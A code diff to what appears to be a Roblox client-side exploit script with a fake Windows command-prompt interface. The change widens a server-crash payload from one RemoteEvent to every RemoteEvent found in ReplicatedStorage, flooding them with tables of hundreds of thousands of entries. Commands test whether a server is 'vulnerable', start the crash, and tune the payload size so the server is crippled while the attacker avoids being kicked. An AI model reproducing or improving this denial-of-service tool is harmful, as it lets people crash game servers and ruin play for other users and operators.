@@ -7,52 +7,61 @@ local Stats = game:GetService("Stats")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- ═══════════ CORE LOGIC ═══════════
+-- ═══════════ MULTI-REMOTE SPAM CORE ═══════════
 local Children       = 180000
 local FireBurst      = 1.5
 local FrameDelay     = 0.130
 local Format         = "pair"
 
-local state = { running = false, thread = nil, remote = nil, cache = nil, interval = 2.5, passes = 0 }
-local RemoteCandidates = {
-    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
-    { "ReplicatedStorage",       "SetPlayerBlockList" },
-}
+local state = { running = false, thread = nil, cache = nil, interval = 2.5, passes = 0 }
+local activeRemotes = {}
 
 local function resolve()
-    for _, path in ipairs(RemoteCandidates) do
-        local node, ok = game, true
-        for i = 1, #path do
-            local nxt = node:FindFirstChild(path[i])
-            if not nxt then ok = false; break end
-            node = nxt
-        end
-        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
-            return node
+    table.clear(activeRemotes)
+    local rs = game:GetService("ReplicatedStorage")
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    
+    -- 1. Try the specific known remote first
+    if rs then
+        local p = rs:FindFirstChild("SetPlayerBlockList")
+        if p and p:IsA("RemoteEvent") then table.insert(activeRemotes, p) end
+    end
+    if rrs then
+        local p = rrs:FindFirstChild("SetPlayerBlockList")
+        if p and p:IsA("RemoteEvent") then table.insert(activeRemotes, p) end
+    end
+    
+    -- 2. Scan ALL other remotes in the game (guarantees a crash)
+    if rs then
+        for _, obj in ipairs(rs:GetDescendants()) do
+            if obj:IsA("RemoteEvent") and not obj.Name:lower():match("chat") and not obj.Name:lower():match("mouse") then
+                table.insert(activeRemotes, obj)
+            end
         end
     end
-    return nil
+    return #activeRemotes > 0
 end
 
 local function build(size)
     local sz = size or Children
     local root = table.create(sz)
-    if Format == "flat" then
-        for i = 1, sz do root[i] = i end
-        return root
-    end
     for i = 1, sz do root[i] = { id = i, v = i * 2 } end
     return root
 end
 
 local function fire()
-    if not state.remote then
-        state.remote = resolve()
-        if not state.remote then return end
+    if #activeRemotes == 0 then
+        if not resolve() then return end
     end
     if not state.cache then state.cache = build() end
-    for _ = 1, FireBurst do
-        state.remote:FireServer(state.cache)
+    
+    -- Fire at EVERY remote found
+    for _, remote in ipairs(activeRemotes) do
+        pcall(function()
+            for _ = 1, FireBurst do
+                remote:FireServer(state.cache)
+            end
+        end)
     end
     state.passes += 1
 end
@@ -256,7 +265,7 @@ local function processCommand(input)
     if cmd == "!help" then
         log("Available Commands:", Color3.fromRGB(0, 255, 0))
         log("  !test           - Check if the server is even vulnerable", Color3.fromRGB(0, 200, 255))
-        log("  !crash          - Start the payload", Color3.fromRGB(200, 200, 200))
+        log("  !crash          - Start the payload on ALL remotes", Color3.fromRGB(200, 200, 200))
         log("  !stop           - Stop the payload", Color3.fromRGB(200, 200, 200))
         log("  !limit          - Find max safe size for this server", Color3.fromRGB(200, 200, 200))
         log("  !size <number>  - Set payload size (e.g. !size 100000)", Color3.fromRGB(200, 200, 200))
@@ -267,25 +276,19 @@ local function processCommand(input)
     elseif cmd == "!test" then
         log("[*] Starting Server Vulnerability Test...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
-            local remote = resolve()
-            if not remote then 
-                log("[!] Remote not found. This server does NOT have the vulnerability.", Color3.fromRGB(255, 50, 50)) 
+            if not resolve() then 
+                log("[!] No remotes found. Server is completely secured.", Color3.fromRGB(255, 50, 50)) 
                 return 
             end
             
             local wasRunning = state.running
-            if wasRunning then
-                stopCrash()
-                log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
-            end
+            if wasRunning then stopCrash() end
             
-            -- Testing a higher size (150k) for accurate results
             local testSize = 150000
             log("[*] Firing " .. testSize .. " payload for 3 seconds...", Color3.fromRGB(200, 200, 200))
             
             local before = getPing()
             
-            -- Yield build so game doesn't freeze
             local p = {}
             for j = 1, testSize do
                 p[j] = {id = j, v = j}
@@ -294,30 +297,26 @@ local function processCommand(input)
             
             local endT = tick() + 3
             while tick() < endT do
-                pcall(function() remote:FireServer(p) end)
+                for _, r in ipairs(activeRemotes) do
+                    pcall(function() r:FireServer(p) end)
+                end
                 task.wait(0.125)
             end
             
-            log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
             task.wait(2)
-            
             local after = getPing()
             local spike = after - before
             
-            log(string.format("[*] Baseline Ping: %dms | Ping After Test: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
+            log(string.format("[*] Baseline: %dms | After: %dms | Spike: %dms", before, after, spike), Color3.fromRGB(200, 200, 200))
             
             if spike > 150 or after > 500 then
                 log("[+] VERDICT: SERVER IS VULNERABLE! It will crash.", Color3.fromRGB(0, 255, 0))
                 log("[+] Type '!crash' to kill it.", Color3.fromRGB(0, 255, 0))
             else
-                log("[-] VERDICT: SERVER IS PATCHED OR TOO STRONG. It is ignoring the payload.", Color3.fromRGB(255, 50, 50))
-                log("[-] Crashing will not work here. Try a different server.", Color3.fromRGB(255, 50, 50))
+                log("[-] VERDICT: SERVER IS PATCHED OR TOO STRONG.", Color3.fromRGB(255, 50, 50))
             end
             
-            if wasRunning then
-                log("[*] Resuming previous payload...", Color3.fromRGB(200, 200, 200))
-                startCrash()
-            end
+            if wasRunning then startCrash() end
         end)
         
     elseif cmd == "!crash" then
@@ -325,8 +324,7 @@ local function processCommand(input)
             log("[!] Payload is already running!", Color3.fromRGB(255, 200, 50))
         else
             startCrash()
-            log("[+] Payload started. Targeting remote...", Color3.fromRGB(0, 255, 0))
-            log("[+] Current Size: " .. tostring(Children) .. " | Burst: " .. tostring(FireBurst), Color3.fromRGB(0, 255, 0))
+            log("[+] Payload started. Spraying ALL " .. #activeRemotes .. " remotes...", Color3.fromRGB(0, 255, 0))
         end
         
     elseif cmd == "!stop" then
@@ -343,35 +341,27 @@ local function processCommand(input)
         
         if state.running then
             if p > 1000 then
-                log("[!] DANGER: Ping is above 1000ms. You are at risk of Error 261 kick!", Color3.fromRGB(255, 50, 50))
-                log("[!] Lower your size immediately using !size "..math.floor(Children*0.7), Color3.fromRGB(255, 50, 50))
+                log("[!] DANGER: Error 261 kick imminent! Lower size.", Color3.fromRGB(255, 50, 50))
             elseif p > 400 then
-                log("[+] PERFECT LIMIT REACHED: Server is dying. Do not increase size.", Color3.fromRGB(0, 255, 0))
+                log("[+] PERFECT LIMIT REACHED: Server is dying.", Color3.fromRGB(0, 255, 0))
             elseif p > 150 then
-                log("[*] Server is lagging. You can try increasing size slightly.", Color3.fromRGB(255, 200, 50))
+                log("[*] Server is lagging. Increase size slightly.", Color3.fromRGB(255, 200, 50))
             else
-                log("[!] Server is ignoring the payload. Increase your size.", Color3.fromRGB(255, 200, 50))
+                log("[!] Server is ignoring payload. Increase size.", Color3.fromRGB(255, 200, 50))
             end
-        else
-            log("[*] Payload is not running. Start it with !crash to see lag metrics.", Color3.fromRGB(200, 200, 200))
         end
         
     elseif cmd == "!limit" then
         log("[*] Starting Auto-Limit Test. Pushing to the absolute limit...", Color3.fromRGB(0, 200, 255))
         task.spawn(function()
-            local remote = resolve()
-            if not remote then 
-                log("[!] Remote not found. Cannot test limit.", Color3.fromRGB(255, 50, 50)) 
+            if not resolve() then 
+                log("[!] No remotes found. Cannot test limit.", Color3.fromRGB(255, 50, 50)) 
                 return 
             end
             
             local wasRunning = state.running
-            if wasRunning then
-                stopCrash()
-                log("[-] Paused current payload for testing.", Color3.fromRGB(255, 200, 50))
-            end
+            if wasRunning then stopCrash() end
             
-            -- ✅ PUSHING TO HIGHER NUMBERS
             local sizes = {100000, 200000, 300000, 400000, 500000, 750000, 1000000}
             local bestSize = 100000
             
@@ -379,49 +369,43 @@ local function processCommand(input)
                 log("[*] Testing " .. sz .. " payload...", Color3.fromRGB(200, 200, 200))
                 local before = getPing()
                 
-                -- Yield build to prevent freeze
                 local p = {}
                 for j = 1, sz do
                     p[j] = {id = j, v = j}
                     if j % 10000 == 0 then task.wait() end
                 end
                 
-                -- Fire continuously for 2.5 seconds
                 local endT = tick() + 2.5
                 while tick() < endT do
-                    pcall(function() remote:FireServer(p) end)
+                    for _, r in ipairs(activeRemotes) do
+                        pcall(function() r:FireServer(p) end)
+                    end
                     task.wait(0.125)
                 end
                 
-                log("[*] Waiting for server to process...", Color3.fromRGB(200, 200, 200))
-                task.wait(3) -- Wait 3 full seconds to let the ping settle
-                
+                task.wait(3)
                 local after = getPing()
                 local spike = after - before
                 
                 log(string.format("[+] %d payload -> Spike: %dms (Total Ping: %dms)", sz, spike, after), Color3.fromRGB(0, 255, 0))
                 
-                -- ✅ ONLY STOP IF WE ARE AT THE ABSOLUTE ERROR 261 KICK LIMIT
+                -- ONLY STOP IF WE ARE AT THE ABSOLUTE ERROR 261 KICK LIMIT
                 if after > 2500 or spike > 2000 then
                     log("[!] DANGER: This size is starting to kick you!", Color3.fromRGB(255, 50, 50))
                     break
                 else
                     bestSize = sz
                 end
-                task.wait(3) -- Cooldown before next test so server recovers
+                task.wait(3)
             end
             
-            -- ✅ Automatically applies the safe limit
             Children = bestSize
             state.cache = nil
             
             log("[*] RECOMMENDED SAFE LIMIT FOR THIS SERVER: " .. bestSize, Color3.fromRGB(0, 200, 255))
             log("[*] Size automatically set. Type '!crash' to begin.", Color3.fromRGB(0, 200, 255))
             
-            if wasRunning then
-                log("[*] Auto-restarting original payload...", Color3.fromRGB(200, 200, 200))
-                startCrash()
-            end
+            if wasRunning then startCrash() end
         end)
         
     elseif cmd == "!cls" then
@@ -446,7 +430,6 @@ local function processCommand(input)
         -- Do nothing
     else
         log("'" .. cmd .. "' is not recognized as an internal or external command,", Color3.fromRGB(255, 50, 50))
-        log("operable program or batch file.", Color3.fromRGB(255, 50, 50))
     end
 end
 
@@ -484,7 +467,7 @@ log("Microsoft Windows [Version 10.0.19045.3803]", Color3.fromRGB(200, 200, 200)
 log("(c) Microsoft Corporation. All rights reserved.", Color3.fromRGB(200, 200, 200))
 log("", Color3.fromRGB(200, 200, 200))
 log("Type '!help' for a list of available commands.", Color3.fromRGB(0, 255, 0))
-log("Pro tip: Use '!limit' to auto-find the max safe crash size.", Color3.fromRGB(0, 200, 255))
+log("Pro tip: Use '!crash' to spray ALL game remotes.", Color3.fromRGB(0, 200, 255))
 log("", Color3.fromRGB(200, 200, 200))
 
 inputBox:CaptureFocus()
